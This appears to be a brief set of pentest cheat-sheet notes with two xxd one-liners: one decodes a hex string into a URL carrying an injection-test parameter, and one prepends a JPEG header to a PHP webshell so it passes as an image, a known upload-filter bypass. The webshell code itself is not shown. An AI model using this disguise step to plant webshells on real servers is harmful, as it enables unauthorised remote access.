
__convert ascii hex string to ascii__

```bash
echo 687474703a2f2f746573742e656266652e70772f7269636b726f6c6c2e6769663f613d2532322532322532353232 | xxd -r -p
http://test.ebfe.pw/rickroll.gif?a=%22%22%2522
```

__Create php webshell with exif of a jpeg file at beginning__
```bash
xxd -l 0x20 ~/Downloads/1c5fe18a-03eb-4986-b7bb-9ef66c2379a6.jpeg | xxd -r  > ~/test/shell_exifheader.php.jpg
xxd ~/test/shell.php.jpg |  xxd -r >> ~/test/shell_exifheader.php.jpg
```